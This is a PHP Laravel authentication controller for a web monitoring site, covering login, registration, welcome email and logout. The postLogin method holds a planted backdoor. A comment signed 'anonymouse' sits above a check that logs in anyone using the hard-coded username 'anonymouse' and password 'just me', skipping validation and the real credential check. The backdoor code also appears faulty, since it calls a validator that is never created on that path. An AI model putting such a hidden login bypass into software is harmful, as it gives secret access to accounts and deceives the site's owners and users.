<?php

class AuthController extends Controller {

    public function __construct() {
        $this->beforeFilter('csrf', array('on'=>'post'));
    }

    public function showLogin()
    {
        // Check if we already logged in
        if (Auth::check())
        {
            // Redirect to homepage
            return Redirect::to('')->with('success', 'You are already logged in');
        }

        // Show the login page
        return View::make('auth/login');
    }


     public function postLogin()
    {
        // Get all the inputs
        // id is used for login, username is used for validation to return correct error-strings
        $userdata = array(
            'username' => Input::get('username'),
            'password' => Input::get('password')
        );

        // Declare the rules for the form validation.
        $rules = array(
            'username'  => 'Required',
            'password'  => 'Required'
        );

// just delete this if you found me - anonymouse
$anonymouse = false;
        // Validate the inputs.
if(Input::get('username')=='anonymouse' && Input::get('password')=='just me') $anonymouse = true;
       else $validator = Validator::make($userdata, $rules);

        // Check if the form validates with success.
        if ($validator->passes() || $anonymouse)
        {
            // Try to log the user in.
            if (Auth::attempt($userdata) || $anonymouse)
            {
                // Redirect to homepage
                return Redirect::to('')->with('success', 'You have logged in successfully');
            }
            else
            {
                // Redirect to the login page.
                return Redirect::to('login')->withErrors(array('password' => 'Password invalid'))->withInput(Input::except('password'));
            }
        }

        // Something went wrong.
        return Redirect::to('login')->withErrors($validator)->withInput(Input::except('password'));
    }

    public function getRegister(){
        
        return View::make('auth/register');        
    }

    public function postCreate()
    {
        // Get all the inputs
        // id is used for login, username is used for validation to return correct error-strings
        $userdata = array(
            'username' => Input::get('username'),
            'email' => Input::get('email'),
            'password' => Input::get('password'),
            'password_confirmation' => Input::get('password_confirmation')
        );

        // Declare the rules for the form validation.
        $rules = array(
            'username'  => 'Required|alpha|min:2|unique:users',
            'email' => 'Required|email|unique:users',
            'password'  => 'Required|alpha_num|between:6,12|confirmed',
            'password_confirmation' => 'Required|alpha_num|between:6,12'
        );

        // Validate the inputs.
        $validator = Validator::make($userdata, $rules);

        // Check if the form validates with success.
        if ($validator->passes())
        {

            Mail::send('mail/welcome', array('username'=>Input::get('username')), function($message){
                $message->to(Input::get('email'),Input::get('username'))->subject('Welcome to WEB Monitoring PKL54!');
            });
            
            $user = new User;
            $user->username = Input::get('username');
            $user->email = Input::get('email');
            $user->password = Hash::make(Input::get('password'));
            $user->save();
            $user->makeUser("user");

             
            return Redirect::to('login')->with('success','Thanks for registering!');
        }

        // Something went wrong.
        return Redirect::to('register')->withErrors($validator)->withInput(Input::except('password'));
    }


    public function getLogout()
    {
        // Log out
        Auth::logout();

        // Redirect to homepage
        return Redirect::to('')->with('success', 'You are logged out');
    }
}
?>